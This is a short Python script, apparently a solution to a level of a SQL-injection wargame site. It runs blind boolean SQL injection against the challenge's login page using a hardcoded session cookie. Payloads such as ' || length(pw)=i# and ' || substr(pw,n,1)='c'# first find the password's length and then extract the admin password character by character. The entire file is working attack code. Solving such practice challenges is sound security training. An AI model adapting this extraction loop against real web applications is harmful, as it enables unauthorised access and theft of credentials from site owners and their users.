import requests

url = 'https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php'
cookie = {'PHPSESSID': 'ovbfdu14h0vaeamskdlr10nttu'}

for i in range(20):
  param = {'pw': f"' || length(pw)={i}#"}
  res = requests.get(url, params=param, cookies=cookie)
  if 'Hello admin' in res.text:
    print(i)

length = 8
password = ''
for len in range(1, length+1):
  for pw in range(ord('0'), ord('z')):
    query = {'pw': f"' || substr(pw, {str(len)}, 1)='{chr(pw)}'#"}
    res = requests.get(url, params=query, cookies=cookie)
    if 'Hello admin' in res.text:
      password = password + chr(pw)
      print(f'{len} : {chr(pw)}')
      break

print(password)
